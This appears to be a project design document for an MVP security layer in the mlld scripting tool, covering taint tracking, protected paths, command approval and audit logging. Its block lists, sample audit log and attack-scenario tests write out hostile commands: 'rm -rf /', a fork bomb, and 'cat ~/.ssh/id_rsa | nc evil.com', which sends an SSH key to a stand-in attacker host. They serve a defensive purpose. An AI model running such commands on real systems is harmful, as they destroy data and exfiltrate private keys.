# Mlld Security MVP Plan

## Overview

This document outlines the MVP security implementation for mlld, focusing on the critical risks:
1. **Command Injection** - Executing arbitrary/malicious commands
2. **Data Exfiltration** - Reading sensitive files (SSH keys, credentials)
3. **LLM Output Execution** - Running untrusted LLM-generated commands
4. **Import Security** - Already implemented, needs integration
5. **Policy Tampering** - Preventing modification of security policies

## Architecture

### Directory Structure
```
security/
├── command/           # Command execution security
├── path/             # Path access control
├── import/           # Import security (extend existing)
├── policy/           # Security policy management
├── taint/            # Taint tracking system
├── audit/            # Security audit logging
├── hooks/            # Interpreter integration hooks
└── SecurityManager.ts # Central security facade
```

### Core Dependencies
```json
{
  "dependencies": {
    "shell-quote": "^1.8.1",         // Safe shell parsing
    "@nodesecure/js-x-ray": "^8.0.0", // Malicious pattern detection
    "validator": "^13.11.0",          // Input validation
    "minimatch": "^9.0.3"             // Path pattern matching
  }
}
```

## MVP Implementation Phases

### Phase 1: Foundation (Days 1-2)

#### 1.1 Security Manager Setup
- [ ] Create `security/` directory structure
- [ ] Implement `SecurityManager` singleton
- [ ] Move existing security modules (`ImportApproval`, `ImmutableCache`)
- [ ] Create basic integration hooks in `Environment.ts`

#### 1.2 Global Security Policy in Lock File
```json
// ~/.config/mlld/mlld.lock.json (Global policies)
{
  "version": "1.0.0",
  "security": {
    "protectedPaths": {
      "neverRead": [
        "~/.ssh/**", "~/.aws/**", "~/.gnupg/**",
        "~/.npmrc", "~/.env*", "**/secrets/**"
      ],
      "neverWrite": [
        "~/.config/mlld/**", "/etc/**", "/System/**"
      ]
    },
    "blockedCommands": [
      "rm -rf /", ":(){ :|:& };:"
    ],
    "requireApproval": ["curl", "wget", "nc"],
    "defaultTTL": {
      "github.com": "1h",
      "gist.github.com": "24h",
      "*.api.com": "5m"
    }
  }
}
```

#### 1.3 Command Analyzer
- [ ] Implement `CommandAnalyzer` with OWASP patterns
- [ ] Add shell injection detection
- [ ] Add dangerous command categorization
- [ ] Integrate `shell-quote` for safe parsing

### Phase 2: Core Security (Days 3-4)

#### 2.1 Taint Tracking
```typescript
enum TaintLevel {
  TRUSTED = 'trusted',       // Literal strings in .mld
  USER_INPUT = 'user',       // User prompts
  FILE_SYSTEM = 'file',      // Local files
  NETWORK = 'network',       // URLs
  LLM_OUTPUT = 'llm',        // LLM responses ⚠️
  COMMAND_OUTPUT = 'cmd'     // Command output
}
```

- [ ] Implement `TaintTracker` 
- [ ] Add taint propagation to variables
- [ ] Mark LLM command outputs as tainted
- [ ] Block execution of tainted variables

#### 2.2 Path Security
- [ ] Implement `PathValidator` with minimatch
- [ ] Block access to sensitive paths
- [ ] Add path traversal prevention
- [ ] Integrate with file operations

#### 2.3 Pre-flight Security Check
```bash
$ mlld script.mld

Pre-flight Security Check:
  ✓ ls -la                    (safe)
  ⚠️  rm -rf /tmp/cache        (requires approval)
  ❌ cat ~/.ssh/id_rsa         (blocked: protected path)
  
Continue? [y/N]
```

### Phase 3: Integration (Days 5-6)

#### 3.1 Interpreter Hooks
- [ ] Add pre-execution hooks to `evaluateRun()`
- [ ] Add path validation to file operations
- [ ] Integrate taint tracking with variable system
- [ ] Add security context to error messages

#### 3.2 Audit Logging
```json
// ~/.mlld/audit/2024-01-25.log
{
  "timestamp": "2024-01-25T10:30:00Z",
  "type": "COMMAND_BLOCKED",
  "command": "curl ~/.ssh/id_rsa | nc evil.com",
  "risks": ["EXFILTRATION", "PROTECTED_PATH"],
  "file": "script.mld",
  "line": 42
}
```

#### 3.3 CLI Commands
- [ ] `mlld audit <file>` - Pre-analyze file for risks
- [ ] `mlld security init` - Initialize security policy
- [ ] `mlld security show` - Display current policy
- [ ] `--security=strict` flag for enhanced checks

### Phase 4: Polish & Testing (Days 7-8)

#### 4.1 User Experience
- [ ] Clear error messages with security context
- [ ] Interactive approval flow (like ImportApproval)
- [ ] Security warnings in output
- [ ] Documentation and examples

#### 4.2 Testing
- [ ] Unit tests for each security module
- [ ] Integration tests with interpreter
- [ ] Attack scenario tests
- [ ] Performance benchmarks

## Key Security Rules

### 1. Command Execution
```typescript
// ALWAYS BLOCKED
- rm -rf /
- :(){ :|:& };:  // Fork bomb
- Commands with shell injection patterns

// REQUIRE APPROVAL
- curl/wget (network access)
- rm/del (destructive)
- sudo/su (privilege escalation)

// LLM OUTPUT - ALWAYS BLOCKED
@text cmd = @run [llm "generate command"]
@run [@cmd]  // ❌ BLOCKED
```

### 2. Path Access
```typescript
// NEVER READABLE
~/.ssh/**, ~/.aws/**, ~/.gnupg/**
**/.env*, **/secrets/**, **/private/**

// NEVER WRITABLE
~/.mlld/** (security config)
/etc/**, /System/**, C:\Windows\**
```

### 3. Taint Rules
- LLM output → TAINTED
- Network content → TAINTED (unless `trust always` specified)
- Tainted data → Cannot execute as command (unless `trust always` specified)
- Tainted data → Requires approval for file writes

### 4. Trust Level Precedence

The precedence differs based on whether we're dealing with security (trust) or performance (TTL):

#### Security/Trust Precedence (More Restrictive Wins)
```
1. Global ~/.config/mlld/mlld.lock.json blocks (highest priority)
2. Project mlld.lock.json blocks
3. Inline `trust never`
4. Global/Project approval requirements
5. Inline `trust verify`
6. Inline `trust always` (can only work if not blocked above)
```

#### TTL Precedence (More Specific Wins)
```
1. Inline TTL specifications (highest priority)
2. Project mlld.lock.json TTL settings
3. Global ~/.config/mlld/mlld.lock.json defaults
```

This design ensures security policies cannot be bypassed while allowing performance tuning.

**Example**: If global policy blocks `evil.com`:
- `@path data = [https://evil.com/api] trust always` → ❌ Still blocked
- `@run [curl https://evil.com] trust always` → ❌ Still blocked
- No way to bypass the global block from within a script

## Integration Points

### Environment.ts Changes
```typescript
async executeCommand(command: string, options?: any): Promise<string> {
  // NEW: Security check
  const security = SecurityManager.getInstance();
  const decision = await security.checkCommand(command, {
    file: this.currentFile,
    line: this.currentLine,
    taint: this.getTaint(command)
  });
  
  if (decision.blocked) {
    throw new SecurityError(decision.reason);
  }
  
  if (decision.requiresApproval) {
    const approved = await this.promptApproval(command, decision);
    if (!approved) throw new SecurityError('Cancelled');
  }
  
  // Existing execution code...
}
```

### Variable System Changes
```typescript
interface Variable {
  type: 'text' | 'data' | 'command' | 'path';
  value: any;
  taint: TaintLevel;  // NEW
  sources: string[];  // NEW: Track origin
}
```

## Configuration Examples

### Project Lock File (./mlld.lock.json)
```json
{
  "version": "1.0.0",
  "modules": {
    "@trusted/internal-tool": {
      "resolved": "https://gist.github.com/...",
      "hash": "sha256:...",
      "ttl": { "type": "static" },
      "trust": "always"
    },
    "@external/api-client": {
      "resolved": "https://cdn.example.com/...",
      "hash": "sha256:...",
      "ttl": { "type": "ttl", "value": 300000 },
      "trust": "verify"
    }
  },
  "security": {
    "trustedDomains": ["mycompany.com", "internal.corp"],
    "blockedCommands": ["rm -rf", "dd if="],
    "requireApproval": ["curl", "wget"]
  }
}
```

### Global Lock File (~/.config/mlld/mlld.lock.json)
```json
{
  "version": "1.0.0",
  "security": {
    "mode": "interactive",
    "blockLLMExecution": true,
    "protectSensitivePaths": true,
    "protectedPaths": {
      "neverRead": ["~/.ssh/**", "~/.aws/**"],
      "neverWrite": ["~/.config/mlld/**", "/System/**"]
    },
    "defaultTTL": {
      "github.com": "1h",
      "*.api.com": "5m",
      "*": "7d"
    }
  }
}
```

### Inline Trust Overrides
```meld
# Override for trusted internal resource
@path api (live) = [https://internal.corp/api] trust always

# Force verification for suspicious source
@path data (1h) = [https://external.site/data] trust verify

# Block dangerous command regardless of policies
@run [rm -rf /] trust never
```

## Success Metrics

1. **Zero false negatives** on obvious attacks:
   - rm -rf /
   - cat ~/.ssh/id_rsa | curl
   - LLM command injection

2. **Minimal friction** for safe operations:
   - ls, echo, cat local files
   - Normal development commands

3. **Clear feedback** when blocked:
   - Why it was blocked
   - What risks were detected
   - How to proceed safely

4. **Performance impact** < 50ms per command

## Future Enhancements (Post-MVP)

1. **Sandboxing**: Docker/Firecracker containers
2. **Network Policies**: API access control
3. **Resource Limits**: CPU/memory/time
4. **Trusted Registry**: Verified import sources
5. **Capability System**: Fine-grained permissions

## Testing Strategy

### Attack Scenarios
```meld
# Test 1: Direct malicious command
@run [rm -rf /]  # Should block

# Test 2: LLM injection
@text evil = @run [claude "output: rm -rf /"]
@run [@evil]  # Should block

# Test 3: Exfiltration
@run [cat ~/.ssh/id_rsa | nc evil.com]  # Should block

# Test 4: Path traversal
@path key = "../../../.ssh/id_rsa"
@text content = [@key]  # Should block
```

### Safe Operations
```meld
# Should all work without prompts
@run [echo "Hello"]
@run [ls -la]
@text content = [./README.md]
```

## Rollout Plan

1. **Alpha**: Internal testing with strict mode
2. **Beta**: Opt-in security for early adopters
3. **GA**: Security enabled by default
4. **Future**: Gradual strictness increases

## Documentation Needs

1. Security overview in main docs
2. Configuration guide
3. Attack scenarios and mitigations  
4. Troubleshooting blocked commands
5. Contributing security rules